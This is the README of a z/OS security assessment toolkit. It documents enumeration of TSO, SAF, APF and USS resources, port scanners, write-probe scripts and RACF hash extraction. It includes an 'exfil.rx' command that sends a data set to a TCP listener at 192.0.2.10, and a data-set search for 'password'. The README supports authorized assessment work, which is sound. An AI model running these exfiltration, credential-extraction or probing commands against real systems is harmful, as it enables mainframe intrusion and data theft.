# z/OS Enumeration and Security Assessment Toolkit

This repository contains tools for authorized z/OS security assessment across
TSO, JES, SAF-managed resources, data sets, and z/OS UNIX System Services
(USS). The primary tools are:

- `ENUM`: TSO REXX system and security enumeration
- `ACCESS`: callable HLASM helper for effective SAF access checks
- `OMVSEnum`: ordinary-user USS security enumeration
- `GhostWalker`: recursive USS permission auditing

Detailed USS build and usage instructions are in
[`Unix/README.md`](Unix/README.md).

## Authorization, safety, and auditing

Use these tools only on systems and data for which you have explicit
authorization.

- `ENUM`, `ACCESS`, `safauth`, and `APFCHECK` perform SAF authorization
  requests. They do not change the tested resources, but an external security
  manager can audit the requests.
- `PDSTEST.rexx` and `PDSACCESSTEST.rexx` intentionally attempt writes. Use
  disposable targets and verify cleanup.
- `OMVSEnum --active-probes` performs bounded tests using temporary files and
  attributes. The default OMVSEnum run is passive.
- `Legacy/exfil.rx`, `racf2john.java`, content searches, and report files can
  expose sensitive information. Protect all resulting data.
- Port scanners can trigger network monitoring and should only target approved
  systems and ranges.

The repository-level [`LICENSE`](LICENSE) is MIT. Some individual Java files
retain their own GPLv3 notices; those file-level notices continue to apply.

## Repository layout

### TSO, REXX, HLASM, and JCL

| File | Role | Execution environment |
|---|---|---|
| [`ENUM`](ENUM) | Primary z/OS enumerator | TSO; partial USS support |
| [`ACCESS`](ACCESS) | Effective SAF access helper | TSO load module |
| [`APFCHECK`](APFCHECK) | Self-contained APF library audit job | JES batch |
| [`Legacy/SEARCHRX.rx`](Legacy/SEARCHRX.rx) | Legacy RACF SEARCH wrapper | TSO |
| [`Legacy/SYS0WN.rx`](Legacy/SYS0WN.rx) | Legacy SYSPROC/SYSEXEC mapper | TSO |
| [`Legacy/startmap.rx`](Legacy/startmap.rx) | Legacy IPL/PARMLIB mapper | TSO |
| [`Legacy/dsnsrch.rx`](Legacy/dsnsrch.rx) | Legacy data set content search | TSO |
| [`PDSTEST.rexx`](PDSTEST.rexx) | Data set write test | TSO; modifies data |
| [`PDSACCESSTEST.rexx`](PDSACCESSTEST.rexx) | PDS member write test | TSO; modifies data |
| [`Legacy/exfil.rx`](Legacy/exfil.rx) | Legacy data set transfer over TCP | TSO; network egress |

### USS tools

The [`Unix`](Unix) directory contains OMVSEnum, GhostWalker, native SAF
support, port scanners, RACF hash extraction, a Makefile, and JCL generation.
See [`Unix/README.md`](Unix/README.md) for the complete file classification and
usage reference.

## Prerequisites

Requirements vary by tool:

- z/OS TSO/E REXX and permission to run the required TSO services
- JES submission access for JCL tools
- HLASM and a linker for `ACCESS` and `APFCHECK`
- ASMA90, HEWL, SYS1.MACLIB and SYS1.MODGEN for the supplied compile jobs
- z/OS UNIX and Java 8 or newer for Java tools
- a 31-bit IBM C compiler for the optional USS `safauth` helper
- appropriate read access to control blocks, configuration members, data sets,
  USS paths, and network targets being assessed

Legacy RACF-specific scripts such as `Legacy/SEARCHRX.rx` require RACF and
sufficient command authority. `ENUM` and the SAF helpers are designed to
remain useful with RACF, ACF2, or Top Secret, although available evidence
varies by ESM.

## Install the release

The release is [ENUM.XMI](ENUM.XMI), a nested TSO TRANSMIT package.
Verify [ENUM.XMI.sha256](ENUM.XMI.sha256) locally:

```sh
shasum -a 256 -c ENUM.XMI.sha256
```

Upload **in binary mode**, without ASCII/EBCDIC conversion, to a new
sequential FB 80 dataset named `yourid.ENUM.XMI`. Do not upload as text,
add newlines, or use a browser/editor to save its contents. Allocate enough
space for the complete artifact. With configured Zowe credentials:

```sh
zowe zos-files create data-set-sequential YOURID.ENUM.XMI \
  --record-format FB --record-length 80 --block-size 27920 \
  --primary-space 20 --secondary-space 5
zowe zos-files upload file-to-data-set ENUM.XMI YOURID.ENUM.XMI --binary
```

At the TSO READY prompt (replace YOURID with your executing TSO ID):

```text
RECEIVE INDATASET('YOURID.ENUM.XMI')
```

At RECEIVE's restore-parameters prompt enter:

```text
DATASET('YOURID.ENUM.XMILIB')
```

Then execute the packaged installer:

```text
EX 'YOURID.ENUM.XMILIB(INSTALL)'
```

Before receiving the outer package, ensure `YOURID.ENUM.XMILIB` is absent;
rename any existing copy to an unused backup name. INSTALL checks **all five**
destination datasets before receiving any of them and refuses existing or
indeterminate destinations. It never merges or replaces installed libraries.
If a later RECEIVE fails, successfully received earlier libraries remain;
inspect and preserve partial results before retrying.

| Dataset suffix | Contents |
|---|---|
| `LOADLIB` | ACCESS and APFCHECK MVS load modules |
| `SOURCE` | Assembler, Java and C sources, Makefile, separate compile JCL |
| `REXXLIB` | ENUM and all seven additional/legacy REXX utilities |
| `JCLLIB` | All compile, run, allocation and packaging JCL; legacy USS shell and license |
| `UNIXTAR` | Binary tar archive of USS JARs and native executables |
| `XMILIB` | Five nested XMIT members and INSTALL CLIST |

All installed dataset names use the executing user's ID. `PHIL` is only the
build identity used for this release. `XMI/ENUM.XMI` (with `XMI/ENUM.XMI.sha256`)
is the version-controlled copy of this current release artifact. Rebuilding
locally with `release/package.jcl` produces the same content at the
repository root as `ENUM.XMI`/`ENUM.XMI.sha256`; those root copies are
gitignored working output, not a separate artifact.

## TSO and batch quick start

Run interactively:

```text
EX 'YOURID.ENUM.REXXLIB(ENUM)' 'ALL'
```

Or submit `YOURID.ENUM.JCLLIB(RUNENUM)` through JES. This runs ENUM under
batch TSO with `IKJEFT1B`, uses `&SYSUID..ENUM.REXXLIB` as SYSEXEC and
`&SYSUID..ENUM.LOADLIB` as STEPLIB, and writes output to spool. Change the
argument from `ALL` to the desired ENUM option. No interactive TSO session
or USS deployment is required for batch execution.

ENUM resolves ACCESS with:

```rexx
accessProgram = USERID() || '.ENUM.LOADLIB(ACCESS)'
```

Set it to `''` only to disable SAF access checks. All REXX member names fit
eight characters; `PDSACCESSTEST.rexx` maps to `PDSATST`.


## ENUM

`ENUM` gathers system, session, ESM, APF, SVC, TSO table, catalog, LINKLIST,
LPA, SMF, PARMLIB, and current-address-space library information. Much of the
inventory comes from z/OS control blocks rather than privileged display
commands.

### Invocation

```text
EX 'YOUR.REXX.LIB(ENUM)' '<argument>'
```

| Argument | Description |
|---|---|
| `ALL` | Run the standard full inventory, including baseline AUTH checks |
| `ASSESS [ip]` | Run the full inventory and append assessment findings; optional IP is report metadata |
| `APF` | APF-authorized data sets and effective access |
| `AUTH [ALL] [userid]` | Curated SAF capability checks; `ALL` also displays denied/no-decision results |
| `CAT` | Master catalog information and effective access |
| `JOB` | Caller, account, terminal, ASID, job/session, and step context |
| `LIBS` | Logical PARMLIB and current address-space library DDs |
| `LNK` | Current LINKLIST set, APF status, volume, and effective access |
| `LPA` | LPA library data sets and effective access |
| `PATH` | Current SYSPROC/SYSEXEC-style data set concatenations |
| `SEC` | RACF, ACF2, or Top Secret security-manager information |
| `SMF` | SMF recording data sets, status, utilization, and access |
| `SVC` | Installed SVC inventory |
| `TSTA` | TESTAUTH authorization status |
| `TSOT` | TSO AUTHCMD, AUTHPGM, NOTBKGND, and AUTHTSF tables |
| `USSU` | USS/OMVS user list |
| `VERS` | Operating-system version information |
| `WHO` | Logged-on TSO and OMVS users |
| `HELP` | Print the compact usage banner and exit successfully |

Examples:

```text
EX 'YOUR.REXX.LIB(ENUM)' 'SEC'
EX 'YOUR.REXX.LIB(ENUM)' 'LIBS'
EX 'YOUR.REXX.LIB(ENUM)' 'AUTH'
EX 'YOUR.REXX.LIB(ENUM)' 'AUTH ALL IBMUSER'
EX 'YOUR.REXX.LIB(ENUM)' 'ASSESS 192.0.2.10'
```

### AUTH and ACCESS behavior

`AUTH` checks selected `FACILITY`, `UNIXPRIV`, `TSOAUTH`, `OPERCMDS`,
`SURROGAT`, and `JESJOBS` resources for the current identity. The optional
user ID changes the concrete SURROGAT and JESJOBS target; it does not impersonate
that user. Baseline current-user checks are included in `ALL` and `ASSESS`.

By default, `AUTH` prints granted capabilities. `AUTH ALL` additionally shows
`DENIED`, `NO DECISION`, and helper errors. Granted sensitive capabilities are
included in ASSESS findings.

`ACCESS` is silent and returns the caller's highest effective access:

| Return code | Effective access |
|---:|---|
| 0 | NONE |
| 4 | READ |
| 8 | UPDATE |
| 12 | CONTROL |
| 16 | ALTER |
| 20 | UNPROTECTED / no matching protection |
| 64 | Invalid input or unexpected SAF result |

Direct TSO examples:

```text
CALL 'YOURID.ENUM.LOADLIB(ACCESS)' 'DATASET SYS1.PARMLIB VOLSER'
CALL 'YOURID.ENUM.LOADLIB(ACCESS)' 'RESOURCE TSOAUTH READ CONSOLE'
```

The legacy data set form remains accepted:

```text
CALL 'YOURID.ENUM.LOADLIB(ACCESS)' 'SYS1.PARMLIB VOLSER'
```

The requested RESOURCE access is a threshold used by ENUM; ACCESS returns the
highest effective level. `UNPROTECTED` is kept distinct from `NONE`.

### TSO versus USS

TSO is the complete execution environment for ENUM. It can also be copied to
USS and invoked there, but TSO-only evidence degrades:

- the callable `ACCESS` load module and `AUTH` section require TSO
- effective data set access can display as `N/A`
- current-address-space TIOT results can be empty or limited
- commands unavailable under OMVS are skipped or reported as unavailable

The generated USS JCL runs selected ENUM sections rather than relying on a full
USS `ALL` run.

### Library inventory limitations

`LIBS` reads logical PARMLIB from the in-memory IPA and walks the current
address-space TIOT for `SYSPROC`, `SYSEXEC`, `IEFPDSI`, `IEFJOBS`, and
`PROCxx` allocations. It does not enumerate every private allocation in other
address spaces or every JES2 dynamic PROCLIB.

### Assessment output

`ASSESS` appends human-readable findings and verification guidance to the
normal enumeration output. It does not currently emit a standalone JSON
document.

## APFCHECK

`APFCHECK.hlasm` calls `CSVAPF REQUEST=LIST`, checks effective dataset access
with SAF, and prints `ACCESS | VOLUME | DATASET` to SYSPRINT.

Submit `JCLLIB(CMPAPF)` to assemble/link, then `JCLLIB(RUNAPF)` when an
application audit is intended. The root `APFCHECK` file is now the run-only
JCL. Rebuilding no longer starts an APF audit.


## Legacy TSO utilities

The following older standalone tools are retained under [`Legacy`](Legacy)
for reference and specialized use. They are not part of the supported ENUM or
USS deployment workflows and should be reviewed against the target system
before use.

### SEARCHRX.rx

Runs a fixed group of RACF `SEARCH`/`SR` commands for WARNING-mode data sets,
readable data sets, UNIXPRIV profiles, BPX FACILITY profiles, and SURROGAT
profiles.

```text
EX 'YOUR.REXX.LIB(SEARCHRX)'
```

This script is RACF-specific and only produces useful results when the caller
has sufficient RACF SEARCH authority.

### SYS0WN.rx

Walks the current TSO address-space TIOT and reports SYSPROC/SYSEXEC data sets,
volumes, creation/reference dates, and RACF access derived through `LISTDSI`
and `LISTDSD`.

```text
EX 'YOUR.REXX.LIB(SYS0WN)'
```

It is RACF- and TSO-specific. Prefer `ENUM PATH` or `ENUM LIBS` when using the
ESM-agnostic ACCESS integration.

### startmap.rx

Maps the IPL source, system symbols, logical PARMLIB, and selected startup
members such as IEASYSxx, IEASYMxx, PROGxx, LPALSTxx, BPXPRMxx, and master JCL.

```text
EX 'YOUR.REXX.LIB(STARTMAP)'
```

This older standalone mapper is retained for focused startup analysis. It
depends on readable IPLPARM/PARMLIB members and version-sensitive control-block
offsets. Review it against the target z/OS release before relying on results.

### dsnsrch.rx

Reads a sequential input list containing one data set name per record and
searches accessible PS, PDS members, and supported VSAM data for a
case-insensitive string. RECFM=U data sets are skipped.

```text
EX 'YOUR.REXX.LIB(DSNSRCH)' 'YOUR.INPUT.LIST password'
```

The input list must already exist. A catalog/access discovery tool can be used
to prepare it. This is older utility code with limited error handling; test it
against representative PS, PDS, and VSAM inputs before a large search.

### PDSTEST.rexx

Reads a list of data set names and interactively attempts a write to each
target.

```text
EX 'YOUR.REXX.LIB(PDSTEST)' 'YOUR.DSN(LIST) testtext'
```

This modifies data wherever the write succeeds. Do not use production targets
unless the exact change is authorized and recoverable.

### PDSACCESSTEST.rexx

Prompts before attempting to create or write a named member in each listed
PDS:

```text
EX 'YOURID.ENUM.REXXLIB(PDSATST)' 'YOUR.DSN(LIST) TESTMEM'
```

Successful tests create or alter `TESTMEM`. Use a disposable member name and
perform explicit cleanup.

### exfil.rx

Experimental TSO REXX socket utility intended to send a data set to an
approved TCP listener:

```text
EX 'YOUR.REXX.LIB(EXFIL)' 'DATASET.TO.SEND 192.0.2.10 443 8443'
```

Treat this as sensitive, active network tooling. The current source is legacy
and should be reviewed and tested before use; do not assume that all fallback
ports or error paths behave reliably. The USS Java `portscan` can help
identify approved reachable listener ports.

## USS deployment summary

`UNIXTAR` is a sequential binary tar archive, not an MVS load library.
The old XMI carried OMVSEnum.jar, GhostWalker.jar, portscan.jar, safauth,
and portscan-c. This release rebuilds those and adds RACF2John.jar.
JARs and USS executable files require this separate layout; LOADLIB holds
only MVS load modules.

USS deployment is two jobs: `JCLLIB(CMPUNIX)` builds, and `JCLLIB(RUNUSS)`
runs. Both create a private working directory under the submitting user's
own OMVS home directory (`cd; home=$(pwd)`), never a hardcoded `/u/userid`
path or `/tmp`, and remove it on exit.

`CMPUNIX` exports sources from SOURCE into that private directory, builds
every Java/C implementation, and replaces the contents of the allocated
UNIXTAR dataset. It runs no application. Build output goes to spool.

`RUNUSS` extracts UNIXTAR into its own private directory and runs OMVSEnum,
then GhostWalker twice against `/`: once with `-r -m -u` (read/write-accessible
paths, last-modified time, owner/group) and once with `-m -u` (writeable
paths, same detail). Both GhostWalker reports are written to files and then
`cat` to spool, since the private directory is removed on exit. The other
UNIXTAR tools (both port scanners, safauth, RACF2John) are still built by
CMPUNIX but are not run by RUNUSS; edit `release/run_unix.jcl` to invoke
them. Supply absolute paths for reports you want to retain outside the job.

`Unix/UNIXENUM.sh` now generates `Unix/UNIXENUM.jcl` from
`release/run_unix.jcl`. It uses the installed package, does not embed
thousands of source lines, and does not delete a shared USS deployment folder.
Edit the release run job, then regenerate with:

```sh
sh Unix/UNIXENUM.sh > Unix/UNIXENUM.jcl
```


### Experimental portscan parallelism

The USS Java and C port scanners now share the same CLI:

```text
portscan <host> <start-port> <end-port>
         [--timeout <ms>] [--threads <count>] [--debug]
```

The default is one sequential worker. `-T`/`--threads` enables experimental
parallelism with 1-64 workers; it is never enabled by the Makefile or generated
JCL. Java uses a bounded thread pool, while C uses bounded nonblocking socket
multiplexing. See [`Unix/README.md`](Unix/README.md#port-scanners) for build,
exit-code, and usage details.

## Troubleshooting

- **ACCESS returns 64:** verify the mode, class length, entity, requested
  access value, and TSO execution environment.
- **ENUM shows `N/A`:** confirm `accessProgram`, load-library access, and that
  ENUM is running under TSO rather than directly under OMVS.
- **Assembler/linker dependencies are unavailable:** adapt the supplied
  ASMA90/HEWL jobs and system macro-library names to local standards.
- **RACF commands are rejected:** use ENUM/ACCESS where possible; the legacy
  SEARCHRX and SYS0WN tools require authorities not granted to many assessment
  identities.
- **USS Java is not in PATH:** invoke `java` and `javac` by their full
  `/usr/lpp/java/.../bin` paths or update CMPUNIX and RUNUSS.

## Generated and local-only artifacts

- `Unix/UNIXENUM.jcl` is generated from `Unix/UNIXENUM.sh`.
- OMVSEnum and GhostWalker reports are runtime output and are not checked in.
- Compiled `.class` and `.jar` files plus `safauth` are build products.
- `.vscode` and `.claude` files are local editor/assistant configuration, not
  runtime dependencies.

## Rebuild and repackage

See [release/RELEASE_NOTES.md](release/RELEASE_NOTES.md) for the exact member
mapping and build/deployment prerequisites, and
[release/VALIDATION.md](release/VALIDATION.md) for measured results and limits.
[release/members.json](release/members.json) is the machine-readable mapping.

1. Inspect existing datasets and preserve them under checked unused names.
   `release/allocate.jcl` allocates new libraries only and refuses collisions.
2. Stage local members with `python3 release/stage.py /tmp/enum-stage-UNIQUE`.
   The staging directory must not already exist. Upload SOURCE, JCLLIB,
   REXXLIB and XMILIB directories into their corresponding allocated PDSs:
   `zowe zos-files upload dir-to-pds /tmp/enum-stage-UNIQUE/SOURCE
   YOURID.ENUM.SOURCE --encoding IBM-1047` (one shell line).
   Repeat for the other three directories. Never use text transfer for XMITs.
3. Submit CMPACC, CMPAPF and CMPUNIX; check individual compiler and binder
   diagnostics and return codes. Compile JCL is identical in SOURCE and JCLLIB.
   No run job is needed to build or validate packaging.
4. Ensure `YOURID.ENUM.XMI` is absent or preserved under an unused name.
   Submit `release/package.jcl` or JCLLIB(PACKAGE). It uses OUTDDNAME for
   local XMIT output, including the sequential UNIXTAR archive.
5. Download `YOURID.ENUM.XMI` with Zowe `--binary --file ENUM.XMI`, then run
   `shasum -a 256 ENUM.XMI > ENUM.XMI.sha256`.
6. Repeat the binary upload/receive/installer/member comparison protocol in
   VALIDATION.md before publishing a changed artifact.

The installer follows the references' DATA PROMPT/ENDDATA convention.
USS jobs use STDPARM for shell commands; see
[IBM's BPXBATCH documentation](https://www.ibm.com/docs/en/zos/3.1.0?topic=environments-bpxbatch).
